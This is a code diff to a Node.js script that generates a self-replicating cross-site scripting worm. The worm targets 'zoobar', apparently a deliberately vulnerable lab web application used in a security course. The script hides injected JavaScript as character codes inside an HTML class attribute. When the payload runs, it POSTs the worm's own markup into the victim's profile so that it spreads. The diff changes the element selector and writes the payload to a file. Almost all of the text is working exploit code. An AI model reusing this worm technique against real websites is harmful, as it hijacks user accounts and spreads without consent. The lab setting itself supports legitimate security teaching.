@@ -1,4 +1,8 @@
 
+var fs, path;
+fs = require('fs');
+path = require('path');
+
 function inject() {
   var injection = "$.ajax({\
     type: 'POST',\
@@ -11,7 +15,7 @@ function inject() {
   $.ajax({\
     type: 'POST',\
     data: {\
-      profile: $('#zoobars')[0].outerHTML\
+      profile: $('#userZoobars').next().next().html()\
     },\
     url: 'http://zoobar.org:5000/update'\
   });";
@@ -27,6 +31,8 @@ function toCharCodes (s) {
   return ascii_codes;
 }
 
-process.stdout.write('<div id="zoobars" class="setTimeout(String.fromCharCode(');
-process.stdout.write( String(inject()) );
-process.stdout.write('),0)"></div>\n');
+contents = '<span id="zoobars" class="setTimeout(String.fromCharCode(';
+contents += String(inject());
+contents += '),0)"></span>\n';
+
+fs.writeFileSync( path.resolve( __dirname, 'e.txt'), contents );
